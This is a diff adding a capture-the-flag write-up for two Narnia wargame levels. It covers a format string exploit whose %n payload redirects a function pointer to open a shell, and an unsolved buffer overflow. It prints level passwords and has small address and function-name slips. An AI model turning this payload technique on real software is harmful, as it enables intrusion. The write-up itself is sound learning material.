@@ -397,3 +397,159 @@ narnia7
 $ cat /etc/narnia_pass/narnia7        
 54RtepCEU0
 ```
+
+### Narnia 07 Solution
+
+Credentials: 54RtepCEU0
+
+We're given a program that takes in user-input and prints out the addresses of some functions:
+```bash
+narnia7@gibson:/narnia$ ./narnia7 abc
+goodfunction() = 0x80492ea
+hackedfunction() = 0x804930f
+
+before : ptrf() = 0x80492ea (0xffffd338)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+```
+We're given the following source code:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int goodfunction();
+int hackedfunction();
+
+int vuln(const char *format){
+    char buffer[128];
+    int (*ptrf)();
+
+    memset(buffer, 0, sizeof(buffer));
+    printf("goodfunction() = %p\n", goodfunction);
+    printf("hackedfunction() = %p\n\n", hackedfunction);
+
+    ptrf = goodfunction;
+    printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);
+
+    printf("I guess you want to come to the hackedfunction...\n");
+    sleep(2);
+    ptrf = goodfunction;
+
+    snprintf(buffer, sizeof buffer, format);
+
+    return ptrf();
+}
+
+int main(int argc, char **argv){
+    if (argc <= 1){
+        fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
+        exit(-1);
+    }
+    exit(vuln(argv[1]));
+}
+
+int goodfunction(){
+    printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
+    fflush(stdout);
+
+    return 0;
+}
+
+int hackedfunction(){
+    printf("Way to go!!!!");
+    fflush(stdout);
+    setreuid(geteuid(),geteuid());
+    system("/bin/sh");
+
+    return 0;
+}
+```
+From first glance, I notice a format string vulnerability with sprintf as there are no format specifiers used. Unfortunately, passing in AAAA%x.%x.%x.%x doesn't show us anything:
+```bash
+narnia7@gibson:/narnia$ ./narnia7 AAAA%x.%x.%x.%x
+goodfunction() = 0x80492ea
+hackedfunction() = 0x804930f
+
+before : ptrf() = 0x80492ea (0xffffd318)
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+```
+I decide to use gdb instead:
+
+![Index html](/assets/images/narnia/07-1.png)
+
+This confirmed a format string vulnerability exists as we can see 41414141 which is the hex representation of AAAA. Now I can use %n to write to any arbitrary memory. I will change ptrf's value to hackedfunction. Luckily we are told where ptrf is in memory (0xffffd328). First I will put 0xffffd328 on the stack by writing it to the buffer. Next I will overwrite it with a new value, which will be the address of hackedfunction (0x804930f). Since %n writes however many bytes it has read, simply trying to write the address of hackedfunction in little endian will not work since %n will treat this as 4 bytes:
+```bash
+$(python3 -c 'import sys;sys.stdout.buffer.write(b"\x18\xd3\xff\xff" + b"\x0f\x93\x04\x08%2$n")')
+```
+Instead, we will need to write the decimal equivalent of the address of hackedfunction (0x804930f) which is 134517519 bytes. Instead of manually writing 134517515 more bytes, we will use the %d padding trick. This is our final payload:
+```bash
+$(python3 -c 'import sys;sys.stdout.buffer.write(b"\x18\xd3\xff\xff%134517515d%2$n")')
+```
+Note, I had to do a bit of guessing to find which argument 0xffffd318 was on the stack and in this case it was the 2nd argument hence why I use %2.
+Running everything:
+```bash
+goodfunction() = 0x80492ea
+hackedfunction() = 0x804930f
+
+before : ptrf() = 0x80492ea (0xffffd318)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ whoami
+narnia8
+$ cat /etc/narnia_pass/narnia8      
+i1SQ81fkb8
+```
+
+### Narnia 08 Solution
+
+Credentials: i1SQ81fkb8
+
+We're just given a program that accepts 1 argument and just prints out the argument we passed in:
+```bash
+narnia8@gibson:/narnia$ ./narnia8 50
+50
+narnia8@gibson:/narnia$ ./narnia8 abc
+abc
+```
+We're given the following source code:
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+// gcc's variable reordering fucked things up
+// to keep the level in its old style i am
+// making "i" global until i find a fix
+// -morla
+int i;
+
+void func(char *b){
+    char *blah=b;
+    char bok[20];
+    //int i=0;
+
+    memset(bok, '\0', sizeof(bok));
+    for(i=0; blah[i] != '\0'; i++)
+            bok[i]=blah[i];
+
+    printf("%s\n",bok);
+}
+
+int main(int argc, char **argv){
+    if(argc > 1)
+            func(argv[1]);
+    else
+    printf("%s argument\n", argv[0]);
+
+    return 0;
+}
+```
+
+From first glance, I notice that the program writes whatever we pass into the bok buffer without ever checking the length of what we pass in. While trying to overflow the buffer, I get this weird output:
+```bash
+narnia8@gibson:/narnia$ ./narnia8 AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAA�����������
+```
+Unfortunately, I could not solve this level :/
